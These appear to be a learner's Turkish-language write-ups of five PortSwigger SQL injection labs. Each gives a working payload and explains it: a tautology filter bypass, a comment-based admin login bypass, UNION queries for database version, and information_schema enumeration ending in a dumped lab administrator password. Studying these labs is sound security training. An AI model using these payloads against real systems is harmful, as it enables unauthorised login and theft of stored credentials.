Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Zorluk: Kolay - https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

Hedef: Piyasaya sürülmemiş ürünleri listelemek.

Zaafiyet: category parametresi filtrelenmeden sorguya ekleniyor.
Orijinal sorgu: SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Payload:
GET /filter?category='+OR+1=1--

Açıklama:
- ' → category='' stringini kapatıp OR 1=1'i gerçek SQL koduna çeviriyor.
- -- → geri kalan sorguyu (kapanmamış tırnak + AND released=1 filtresi) yorum satırına alıp devre dışı bırakıyor.
- Sonuç sorgu: SELECT * FROM products WHERE category='' OR 1=1
- 1=1 her satır için true olduğundan released=0 olan (yayınlanmamış) ürünler de dahil tüm ürünler listeleniyor.

Alternatif payloadlar: ' OR '1'='1  |  ' OR 1=1#  |  ' OR 1=1/*

Sonuç: Çözüldü ✅

---

Lab: SQL injection vulnerability allowing login bypass
Zorluk: Kolay - https://portswigger.net/web-security/sql-injection/lab-login-bypass

Hedef: Şifre bilmeden administrator olarak login olmak.

Zaafiyet: Login sorgusu muhtemelen şu şekilde:
SELECT * FROM users WHERE username = 'x' AND password = 'y'
Önce tırnak (') denendi → syntax error döndü, injection'ın işareti.

Payload:
Username: administrator'--
Password: (herhangi bir şey)

Açıklama:
- ' → username='' stringini kapatıyor.
- -- → geri kalan sorguyu (AND password='...') yorum satırına alıp siliyor.
- Sonuç sorgu: SELECT * FROM users WHERE username='administrator'
- Password kontrolü hiç çalışmıyor, administrator olarak login oluyor.

Sonuç: Çözüldü ✅

---

Lab: SQL injection attack, querying the database type and version on Oracle
Zorluk: Kolay - https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

Hedef: Oracle veritabanının tipini ve versiyonunu sorguyla öğrenmek.

Zaafiyet: category parametresi filtrelenmeden sorguya ekleniyor (UNION-based injection).

Payload:
GET /filter?category=Accessories'UNION SELECT banner, NULL FROM v$version--

Açıklama:
- ' → category string'ini kapatıyor (ilk denemede bu tırnak eksikti, sorgu syntax olarak bozuk kalıp 500 dönüyordu).
- UNION SELECT, orijinal sorgunun sonucuna ikinci bir sorgunun sonucunu ekliyor; sütun sayısı orijinal sorguyla birebir eşleşmeli — burada 2 sütun gerekiyordu.
- Oracle'da FROM'suz SELECT yazılamaz (MySQL'deki SELECT @@version gibi olmuyor), bu yüzden bir tablo/view gerekiyor.
- v$version → Oracle'ın versiyon bilgisini tutan sistem view'ı, banner sütunu bu bilgiyi taşıyor.
- NULL → 2. sütunu tip uyuşmazlığı yaratmadan doldurmak için kullanılan placeholder.
- -- → geri kalan sorguyu susturuyor.
- Sonuç: sayfada ürün adı yerine Oracle versiyon banner'ı görüntüleniyor.

---

Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
Zorluk: Kolay - https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

Hedef: Veritabanı versiyon string'ini görüntülemek.

Zaafiyet: category parametresi filtrelenmeden sorguya ekleniyor (UNION-based injection).

Payload:
GET /filter?category=Gifts' UNION SELECT @@version, 'deneme'#

Açıklama:
- ' → category string'ini kapatıyor.
- @@version → MySQL ve Microsoft SQL Server'a özgü sistem değişkeni, DB versiyon bilgisini doğrudan döndürüyor (Oracle'daki gibi FROM'lu bir view'a gerek yok — bu labın Oracle'dan farkı).
- 'deneme' → 2. sütunu doldurmak için placeholder (2 sütun bekleniyor).
- # → MySQL'de tek satır yorum karakteri, -- alternatifi 
- Sonuç: sayfada ürün adı yerine DB versiyon bilgisi görüntüleniyor.

Sonuç: Çözüldü ✅

---

Lab: SQL injection attack, listing the database contents on non-Oracle databases
Zorluk: Orta - https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

Hedef: users tablosundan administrator şifresini çekip login olmak.

Zaafiyet: category parametresi filtrelenmeden sorguya ekleniyor (UNION-based injection). Non-Oracle olduğu için tablo/sütun keşfi information_schema üzerinden yapılıyor. Önce tek tırnak (') denendi → 500 döndü, injection'ın varlığı.

Payload:
1) Sütun sayısı: category=Pets' UNION SELECT NULL,NULL--   -> 2 sütun geldi
2) Text kontrolü: category=Pets' UNION SELECT 'a','a'--   -> ikisi de text olduğu test edildi
3) Tablolar: category=Pets' UNION SELECT table_name,NULL FROM information_schema.tables--   -> users_vaxbpj
4) Sütunlar: category=Pets' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_vaxbpj'--   -> username_rfejqo, password_lnuotc
5) Veri: category=Pets' UNION SELECT username_rfejqo,password_lnuotc FROM users_vaxbpj--   -> administrator / 8gownbhabyymy2osrzh7

Açıklama:
- ' → category string'ini kapatıyor, UNION SELECT ikinci sorguyu ekliyor; sütun sayısı orijinal sorguyla eşleşmeli, NULL,NULL ile 2 olduğu bulundu.
- 'a','a' → iki sütunun da text tuttuğunu gösteriyor, veri string olarak basılabiliyor.
- information_schema.tables → DB'deki tüm tabloları tutan sistem view'ı; buradan users_vaxbpj tablosu bulundu (Oracle'da all_tables olurdu — non-Oracle farkı).
- information_schema.columns + WHERE table_name='users_vaxbpj' → o tablonun sütun isimlerini döndürüyor: username_rfejqo, password_lnuotc.
- -- → kalan sorguyu susturuyor.
- Son sorgu username ve password sütununu yan yana basıyor; administrator satırındaki plaintext şifreyle login olunuyor.

Sonuç: Çözüldü ✅
